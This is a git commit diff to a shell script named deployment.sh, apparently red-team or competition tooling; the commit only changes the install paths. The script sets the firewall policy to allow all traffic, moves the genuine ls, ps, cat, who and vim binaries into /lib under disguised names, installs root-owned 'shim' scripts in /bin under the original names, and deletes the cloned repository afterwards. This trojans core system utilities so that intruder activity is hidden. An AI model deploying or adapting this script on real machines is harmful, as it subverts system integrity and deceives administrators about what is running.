fa30be5df9633fc69e5919c12ed133a6e1bfe836
shadow5229 <scb5436@rit.edu>
2019-02-16 21:55:33 -0500

    Changed directory structure during install

--- deployment.sh
+++ deployment.sh
@@ -16,7 +16,7 @@ iptables -P INPUT ALLOW
 iptables -P FORWARD ALLOW
 
 # Clone the repository
-git clone -C /tmp https://github.com/shadow5229/CDT-Tools.git
+git clone https://github.com/shadow5229/CDT-Tools.git
 
 # Or if you are hosting on a webserver, comment out the line above (git clone)
 # and uncomment the following lines
@@ -24,14 +24,14 @@ git clone -C /tmp https://github.com/shadow5229/CDT-Tools.git
 # *** ADD WEBSERVER INSTALLTION HERE ***
 
 # Make each script executable
-chmod +x /tmp/CDT-Tools/ls_shim/ls_new
-chmod +x /tmp/CDT-Tools/ps_shim/ps_new
-chmod +x /tmp/CDT-Tools/cat_shim/cat_new
-chmod +x /tmp/CDT-Tools/who_shim/who_new
-chmod +x /tmp/CDT-Tools/vim_shim/vim_new
+chmod +x CDT-Tools/ls_shim/ls_new
+chmod +x CDT-Tools/ps_shim/ps_new
+chmod +x CDT-Tools/cat_shim/cat_new
+chmod +x CDT-Tools/who_shim/who_new
+chmod +x CDT-Tools/vim_shim/vim_new
 
 # Make the owner root
-chown -R root:root /tmp/CDT-Tools
+chown -R root:root CDT-Tools
 
 # Move "healthy" binaries out of /bin
 mv /bin/ls /lib/module_ls
@@ -41,11 +41,11 @@ mv /bin/who /lib/module_who
 mv /bin/vim /lib/module_vim
 
 # Move the shim scripts into /bin with original names
-mv /tmp/CDT-Tools/ls_shim/ls_new /bin/ls
-mv /tmp/CDT-Tools/ps_shim/ps_new /bin/ps
-mv /tmp/CDT-Tools/cat_shim/cat_new /bin/cat
-mv /tmp/CDT-Tools/who_shim/who_new /bin/who
-mv /tmp/CDT-Tools/vim_shim/vim_new /bin/vim
+mv CDT-Tools/ls_shim/ls_new /bin/ls
+mv CDT-Tools/ps_shim/ps_new /bin/ps
+mv CDT-Tools/cat_shim/cat_new /bin/cat
+mv CDT-Tools/who_shim/who_new /bin/who
+mv CDT-Tools/vim_shim/vim_new /bin/vim
 
 # Cleanup the mess
-rm -r /tmp/CDT-Tools
+rm -r CDT-Tools
